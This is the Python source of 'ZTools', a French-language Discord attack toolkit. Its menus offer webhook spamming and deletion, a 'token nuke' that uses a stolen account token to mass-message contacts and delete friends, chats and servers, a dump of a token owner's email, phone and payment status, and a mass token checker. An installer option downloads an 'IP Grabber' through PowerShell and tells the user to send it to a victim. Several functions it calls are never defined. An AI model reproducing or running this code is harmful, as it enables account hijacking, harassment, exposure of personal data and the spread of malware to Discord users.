# -*- coding: utf-8 -*-

from requests import get, post, patch, delete
import requests
from json import dumps, loads
from colorama import Fore, init
from threading import Thread
from time import sleep
import discord
from discord.ext import commands
from os import name, system, getenv
import os
from os.path import isfile, isdir, split as split_path


init()

code = "https://discord.gg/kmCJ25nPcY"


def dev():
    print(Fore.RED + "Ce Tool/Mode est en développement, revenez plus tard !\n")
    print(Fore.GREEN + "Si vous voulez avoir les nouvelles mises à jours, abonnez vous à mon GitHub\n\n")
    input(Fore.YELLOW + "[>] Appuyez sur entrée pour revenir au menu")
    main()

def chargement():
    charg = 0
    while charg < 2:
        system("cls")
        print(Fore.RED + "Chargement en cours.")
        sleep(1)
        system("cls")
        print(Fore.RED + "Chargement en cours..")
        sleep(1)
        system("cls")
        print(Fore.RED + "Chargement en cours...")
        sleep(1)
        charg = charg + 1


def error():
    input(Fore.RED + "Le Programme demandé n'est pas disponible")
    main()

nom_fichier =__file__.split("\\")[-1]

if name == "nt":
    system(f"title ZTools par Pixel / discord.gg/kmCJ25nPcY ")
    system("mode 160, 40")
    def clear():
        system("cls")
else:
    system(f"title ZTools par Pixel | {code} ")
    system("mode 160, 40")
    def clear():
        system("cls")

erreur = Fore.RESET + "[" + Fore.RED + "!" + Fore.RESET + "]"
valide = Fore.RESET + "[" + Fore.GREEN + "!" + Fore.RESET + "]"


liste_oui = ["oui", "oe", "ouai", "ui", "oue"]
liste_non = ["nn", "non", "nan", "nop"]


def headers(token=None):
    headers = {
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11"
        }
    if token:
        headers.update({"Authorization":token})
    return headers


headers_site = {
        "Content-Type": "application/json",
        "User-Agent": "localtunnel"
        }
            
""" 


WEBHOOKS DEF 


"""


def check_webhook(lien):
    try:
        status = get(lien).status_code
        if status in [200, 204]:
            return True
        else:
            return False
    except:
        return False

def send_webhook(lien, username, avatar, content):
    webhook = {"username":username, "avatar_url":avatar, "content":content}
    return (post(lien, data = dumps(webhook).encode("utf-8"), headers=headers()).status_code)

def spam_webhook(lien, username, avatar, content):
    while True:
        try:
            send_webhook(lien, username, avatar, content)
        except:
            return

def delete_webhook(lien):
    return delete(lien).status_code

def patch_webhook(lien, username, avatar):
    try:
        if avatar:
            try:
                pp = get("https://pastebin.com/raw/gjrG0vX5") # Lien de l'image du webhook pour la modification
                if pp.status_code in [200, 204]:
                    pp = pp.text
                else:
                    pp = None
            except:
                pp = None
        else:
            pp = None
    except:
        pp = None
    if pp == None:
        webhook = {"name":username}
    else:
        webhook = {"name":username, "avatar":pp}
    try:
        response = patch(lien, data=dumps(webhook).encode(), headers = headers()).status_code
        if response in [200, 204]:
            return True
        else:
            return False
    except:
        return False

def infos_webhook(lien):
    try:
        resp = get(lien)
        if resp.status_code in [200, 204]:
            return loads(resp.text)
        else:
            return False
    except:
        return False    

""" 


MODE WEBHOOK


""" 

def webhook_mode():
    clear()
    print(Fore.YELLOW + """
    
    
                                                    ██╗    ██╗███████╗██████╗ ██╗  ██╗ ██████╗  ██████╗ ██╗  ██╗███████╗
                                                    ██║    ██║██╔════╝██╔══██╗██║  ██║██╔═══██╗██╔═══██╗██║ ██╔╝██╔════╝
                                                    ██║ █╗ ██║█████╗  ██████╔╝███████║██║   ██║██║   ██║█████╔╝ ███████╗
                                                    ██║███╗██║██╔══╝  ██╔══██╗██╔══██║██║   ██║██║   ██║██╔═██╗ ╚════██║
                                                    ╚███╔███╔╝███████╗██████╔╝██║  ██║╚██████╔╝╚██████╔╝██║  ██╗███████║
                                                     ╚══╝╚══╝ ╚══════╝╚═════╝ ╚═╝  ╚═╝ ╚═════╝  ╚═════╝ ╚═╝  ╚═╝╚══════╝""")
    print(Fore.RED + """
                                                        ____________________________________________________________
                                                                                                                      
                                                          1 : Envoyer un message   3 : Vérifier    5 : Supprimer                                                                                                  
                                                                                                                                                                                 
                                                          2 : Spam                 4 : Modifier    6 : Infos                     
                                                        ____________________________________________________________

                                                                       entrez [q] pour revenir au menu


                                                        """)

    webhook_choice_mode = input(Fore.RED + """                                                       [>] Mode : """)

    print("\n")

    if webhook_choice_mode not in ["1", "2", "3", "4", "5", "6", "q"]:
        webhook_mode()


    elif webhook_choice_mode == "q":
        main()

    lien = input(Fore.YELLOW + "[>] Entrez le lien du webhook : ")
    try:
        rep = check_webhook(lien)
        if rep != True:
            print(erreur, "Le webhook est invalide :/")
            input()
            webhook_mode()
    except:
        print(erreur, "Le webhook est invalide :/")
        input()
        webhook_mode()


    if webhook_choice_mode == "1":
        username = input(Fore.YELLOW + "[>] Entrez le nom du webhook [none pour celui de base] : ")
        if username == "none":
            username = None
        avatar = input(Fore.YELLOW + "[>] Entrez le lien de l'avatar du webhook [none pour celle de base] : ")
        if avatar == "none":
            avatar = None
        content = input(Fore.YELLOW + "[>] Entrez le message à envoyer : ")
        try:
            response = send_webhook(lien, username, avatar, content)
            if response in [200, 204]:
                print(valide, "Message envoyé avec succés!")
            else:
                print(erreur, "Erreur lors de l'envoi du message. Le webhook est peut-être invalide?")
        except:
            print(erreur, "Erreur lors de l'envoi du message. Le webhook est peut-être invalide?")
        input()
        webhook_mode()

    elif webhook_choice_mode == "2":
        username = input(Fore.YELLOW + "Entrez le nom du webhook [none pour celui de base] > ")
        if username == "none":
            username = None
        avatar = input(Fore.YELLOW + "Entrez le lien de l'avatar du webhook [none pour celle de base] > ")
        if avatar == "none":
            avatar = None
        content = input(Fore.YELLOW + "[>] Entrez le message à spammer : ")
        if check_webhook(lien) == True:
            print(valide, "Le webhook est valide!")
            alert = input(Fore.RED + "Le programme continuera à spammer en arrière-plan, et s'arrêtera quand le webhook deviendra invalide. Voulez-vous continuer? [y/n] ")
            if alert == "y":
                Thread(target=spam_webhook, args=(lien, username, avatar, content)).start()
            webhook_mode()
        else:
            print(erreur, "Erreur. Le webhook est invalide :/")
            input()
        webhook_mode()


    elif webhook_choice_mode == "3":
        print(valide, "Le webhook est valide !")
        input()
        webhook_mode()

    elif webhook_choice_mode == "4":
        username = input(Fore.YELLOW + "[>] Entrez le nouveau nom du webhook : ")
        avatar = input(Fore.YELLOW + "[>] Voulez-vous changer l'avatar du webhook par celle de Plague ? [y/n] ")
        if avatar.lower() == "y":
            avatar = True
        else:
            avatar = False
        try: 
            rep = patch_webhook(lien, username, avatar)
            if rep == True:
                print(valide, "La modification du webhook à été réussie!")
                input()
            else:
                print(erreur, "La modification du webhook à échoué :/")
                input()
        except:
            print(erreur, "La modification du webhook à échoué :/")
            input()
        webhook_mode()


    elif webhook_choice_mode == "5":
        try:
            if delete(lien).status_code in [200, 204]:
                print(valide , "Le webhook à été supprimé!")
                input()
                webhook_mode()
            else:
                print(erreur, "Erreur lors de la suppression du webhook :/")
                input()
        except:
            print(erreur, "Erreur lors de la suppression du webhook :/")
            input()  
        webhook_mode()


    elif webhook_choice_mode == "6": 
        try:
            infos = infos_webhook(lien)
            if infos == False:
                print(erreur, "Le webhook est invalide :/")
                input() 
            else:
                print()
                for element in infos:
                    print(Fore.GREEN + f"{element}" + Fore.RESET + " >> " + Fore.YELLOW + f"{infos[element]}")   
                input()
        except:
            print(erreur, "Le webhook est invalide :/")
            input() 
        webhook_mode()
            


"""


TOKEN DEF


"""

friendsIds = []
channelIds = []
guildsIds = []

def token_check(token):
    headers_token = headers(token)
    try:
        statut = get("https://discordapp.com/api/v6/users/@me", headers=headers_token).status_code
    except:
        statut = 401
    if statut not in [200, 204]:
        return False
    else:
        return True

class Login(discord.Client):
    async def on_connect(self):
        for f in self.user.friends:
            friendsIds.append(f.id)

        for c in self.private_channels:
            channelIds.append(c.id)

        for g in self.guilds:
            guildsIds.append(g.id)

        await self.logout()

    def run(self, token):
        try:
            super().run(token, bot=False)
        except:
            clear()
            print("Erreur fatale. Veuillez réessayer :/")
            input()
            exit()

def token_nuke(token):
    clear()
    print(Fore.GREEN + "Récupération des statistiques du compte...")
    Login().run(token) 
    clear()
    headers1 = {'Authorization': token}
    sendall = input(Fore.BLUE + 'Veux tu envoyer un message à tous les amis récemment contactés? [oui-non] ')
    if sendall == 'oui':
        sendmessage = input(Fore.BLUE + 'Que veux-tu envoyer comme message aux amis récents? ')
    fremove = input(Fore.BLUE + 'Veux-tu supprimer toutes les conversations de ce compte? [oui-non] ')
    fdel = input(Fore.BLUE + 'Veux-tu supprimer tous les amis de ce compte? [oui-non] ')
    gdel = input(Fore.BLUE + 'Veux tu supprimer tous les serveurs de ce compte ? [oui-non] ')
    gleave = input(Fore.BLUE + 'Veux-tu quitter tous les serveurs? [oui-non] ')
    gcreate = input(Fore.BLUE + 'Veux-tu créer masse serveurs sur ce compte? [oui-non] ')
    if gcreate == "oui":
        gname = input(Fore.BLUE + "Comment veux-tu que les serveurs crées s'appellent? ")
        gserv = input(Fore.BLUE + 'Combien de serveurs veux-tu créer? [max. 100] ')
    dlmode = input(Fore.BLUE + 'Veux-tu définir le thème du compte en blanc? [oui-non] ')
    langspam = input(Fore.BLUE + 'Veux-tu définir la langue du compte en japonais? [oui-non] ')

    if sendall == 'oui':
        try:
            for id in channelIds:
                post(f'https://discord.com/api/v8/channels/{id}/messages', headers=headers1, data={"content": f"{sendmessage}"})
                print(Fore.GREEN + f"Message envoyé à l'ID : {id}.")
        except:
            print(Fore.Red + f'Erreur détectée.')

    if gleave == 'oui':
        try:
            for guild in guildsIds:
                delete(f'https://discord.com/api/v8/users/@me/guilds/{guild}', headers=headers1)
                print(Fore.GREEN + f'Serveur {guild} quitté.')
        except:
            print(Fore.Red + f'Erreur détectée.')

    if fdel == 'oui':
        try:
            for friend in friendsIds:
                delete(f'https://discord.com/api/v8/users/@me/relationships/{friend}', headers=headers1)
                print(Fore.GREEN + f'Ami {friend} supprimé.')
        except:
            print(Fore.Red + f'Erreur détectée.')

    if fremove == 'oui':
        try:
            for id in channelIds:
                delete(f'https://discord.com/api/v8/channels/{id}', headers=headers1)
                print(Fore.GREEN + f'Conversation {id} supprimée.')
        except:
            print(Fore.Red + f'Erreur détectée.')

    if gdel == 'oui':
        try:
            for guild in guildsIds:
                delete(f'https://discord.com/api/v8/guilds/{guild}', headers=headers1)
                print(Fore.GREEN + f'Serveur {guild} supprimé.')
        except:
            print(Fore.Red + f'Erreur détectée.')

    if gcreate == 'oui':
        try:
            for i in range(int(gserv)):
                payload = {
                    'name': f'{gname}',
                    'region': 'europe', 
                    'icon': None, 
                    'channels': None}
                post('https://discord.com/api/v6/guilds', headers=headers1, json=payload)
                print(Fore.GREEN + f'Serveur [{gname}] crée, numéro: {i + 1} sur {gserv}.')
        except:
            print(Fore.Red + f'Erreur détectée.')

    if dlmode == 'oui':
        try:
            setting = {'theme': "light"}
            patch("https://discord.com/api/v8/users/@me/settings", headers=headers1, json=setting)
            print(Fore.GREEN + "Le thème du compte à été défini sur blanc.")
        except:
            print(Fore.Red + f'Erreur détectée.')

    if langspam == 'oui':
        try:
            setting = {'locale':'ja'}
            patch("https://discord.com/api/v8/users/@me/settings", headers=headers1, json=setting)
            print(Fore.GREEN + "La langue du compte à été définie sur japonais")
        except:
            print(Fore.Red + f'Erreur détectée.')

    input(Fore.RED + "\nAppuyez sur entrée pour continuer...")
    clear()


def token_info(token):
    print(Fore.GREEN + "\nChargement en cours...")
    r = get('https://discord.com/api/v6/users/@me', headers=headers(token)).json()
    username = r['username'] + '#' + r['discriminator']
    userid = r['id']
    phone = r['phone']
    email = r['email']
    try:
        billing = bool(len(loads(get("https://discordapp.com/api/v6/users/@me/billing/payment-sources", headers=headers(token)).read().decode())) > 0)
    except:
        billing = False
    mfa = r['mfa_enabled']
    clear()
    print(Fore.GREEN + f'''
[ID de l'utillisateur]                    {userid}
[Nom d'utilisateur]                       {username}
[Authentification à deux facteurs]        {mfa}
[Carte bleue enregistrée]                 {billing}

[Email]                                   {email}
[Numéro de téléphone]                     {phone if phone else "Pas de numéro de téléphone :/"}
[Token]                                   {token}

    ''')
    input(Fore.RED + "\nAppuyez sur entrée pour continuer...")
    clear()

def mass_token_check(path):
    with open(path, "r") as f:
        contenu = f.read()
        contenu = contenu.splitlines()
    check = []
    valide = []
    for a in contenu:
        if a != "":
            check.append(a)

    largeur = 0
    longueur = len(contenu)
    for token in check:
        if token_check(token) == True:
            largeur += 1
            valide.append(token)
    return largeur, longueur, valide

"""

INSTALLATEUR

"""
nom_pc = getenv("username")

def ztool():
    system(f"""cd C:/Users/{nom_pc}/Desktop && powershell -Command "(New-Object Net.WebClient).DownloadFile('https://github.com/pixel-yo/ZTools/archive/refs/heads/main.zip', 'IP_Grabber_Discord.zip')""")
    print(Fore.BLUE + "L'IP Grabber à été téléchargé sur votre bureau.")
    print(Fore.GREEN + "Pour utiliser le Malware/Tool, décompressez le fichier, entrez votre webhook dedans puis envoyer le fichier à votre victime.")
    input(Fore.RED + "\nAppuyez sur entrée pour revenir au menu.")

def install_mode():


    clear()
    print(Fore.LIGHTMAGENTA_EX + """

                                                        ██╗███╗   ██╗███████╗████████╗ █████╗ ██╗     ██╗     
                                                        ██║████╗  ██║██╔════╝╚══██╔══╝██╔══██╗██║     ██║     
                                                        ██║██╔██╗ ██║███████╗   ██║   ███████║██║     ██║     
                                                        ██║██║╚██╗██║╚════██║   ██║   ██╔══██║██║     ██║     
                                                        ██║██║ ╚████║███████║   ██║   ██║  ██║███████╗███████╗
                                                        ╚═╝╚═╝  ╚═══╝╚══════╝   ╚═╝   ╚═╝  ╚═╝╚══════╝╚══════╝    """)

    print(Fore.CYAN + """
                                                    ______________________________________________________________
                                                                                                                    
                                                        1 : Raidbot       3 : ZTools (.exe)     5 : Bientôt dispo                                                                                                                               
                                                                                                                
                                                        2 : Kr4k3n        4 : Bientôt dispo     6 : Bientôt dispo
                                                    ______________________________________________________________\n\n\n                                                      Certaines parties du code on été récupérés sur github
                                                    
                                                                                                                        """)
    modeinst = input(Fore.YELLOW + """                                      [>] Mode : """)

    if modeinst == "1":
        raidbot()

    if modeinst == "2":
        bloodgrabb()

    if modeinst == "3":
        ztool()

    if modeinst == "4":
        dev()

    if modeinst == "5":
        dev()

    if modeinst == "6":
        dev()

    else:
        error()



                                                      

"""

BOITE DE RECEPTION

"""
def boite_de_reception_mode():
    url = "https://pixel.loca.lt"
    chargement()
    response = requests.get(url)

    if response.status_code in [200, 204]:
        clear()
        print(Fore.GREEN + "NOUVEAUTE >\n\n\n" + Fore.CYAN + f"{response.text}\n\n")
        system("pause")
        main()
    else:
        clear()
        print(Fore.YELLOW + "Aucunes News !")
        os.system("pause")
        main()

"""

CREDITS

"""
def credits_mode():
    clear()
    print(Fore.CYAN + """
                                        ██████╗██████╗ ███████╗██████╗ ██╗████████╗███████╗
                                       ██╔════╝██╔══██╗██╔════╝██╔══██╗██║╚══██╔══╝██╔════╝
                                       ██║     ██████╔╝█████╗  ██║  ██║██║   ██║   ███████╗
                                       ██║     ██╔══██╗██╔══╝  ██║  ██║██║   ██║   ╚════██║
                                       ╚██████╗██║  ██║███████╗██████╔╝██║   ██║   ███████║
                                        ╚═════╝╚═╝  ╚═╝╚══════╝╚═════╝ ╚═╝   ╚═╝   ╚══════╝
                                                    
""")
    os.system("pause")
    clear()
    print(Fore.YELLOW + "Développé par Pixel.exe#0001 pour Arès\n Webhook Tool et Token Tool developpé par Billy, Merci a Zelow pour la Boite de reception\n\n ")
    system("pause")
    main()

def main():
    clear()
    print(Fore.GREEN + """

                                                        ███████╗████████╗ ██████╗  ██████╗ ██╗     ███████╗    
                                                        ╚══███╔╝╚══██╔══╝██╔═══██╗██╔═══██╗██║     ██╔════╝    
                                                          ███╔╝    ██║   ██║   ██║██║   ██║██║     ███████╗    
                                                         ███╔╝     ██║   ██║   ██║██║   ██║██║     ╚════██║    
                                                        ███████╗   ██║   ╚██████╔╝╚██████╔╝███████╗███████║    
                                                        ╚══════╝   ╚═╝    ╚═════╝  ╚═════╝ ╚══════╝╚══════╝    """)

    print(Fore.CYAN + """                                           
                                                        par Zelron | Pour Arès https://discord.gg/kmCJ25nPcY
                                                    ______________________________________________________________
                                                                                                                    
                                                        1 : Webhooks      3 : Nitro Gen         5 : Boite de reception                                                                                                                               
                                                                                                                
                                                        2 : Token Tools   4 : Installateur      6 : 2ème page
                                                    ______________________________________________________________\n\n\n                                                      Certaines parties du code on été récupérés sur github
                                                    
                                                                                                                        """)


    mode = input(Fore.YELLOW + """                                                         [>] Mode : """)


    if mode == "1":
        webhook_mode()
        return

    if mode == "2":
        token_mode()

    if mode == "3":
        generateurs_mode()

    if mode == "4":
        install_mode()

    if mode == "5":
        boite_de_reception_mode()

    if mode == "6":
        main2()

    else:
        error()


"""


LANCEMENT


"""


while True:
    clear() 
    main()

